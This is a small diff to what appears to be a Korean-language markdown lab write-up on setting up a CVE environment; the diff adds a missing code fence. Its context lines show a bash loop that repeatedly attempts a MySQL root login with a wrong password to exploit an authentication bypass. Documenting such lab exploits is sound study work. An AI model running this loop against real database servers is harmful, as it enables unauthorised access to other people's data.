@@ -27,6 +27,7 @@ for i in {1..1000}; do
   echo "Try $i"
   mysql -u root --password=wrongpass -e "select user();" 2>/dev/null && echo "[+] Login Success!" && break
 done
+```
 
 ## 실행 결과
 ![결과 화면]("C:\Users\60dbt\OneDrive\바탕 화면\whs3\cve 환경 구축.png")
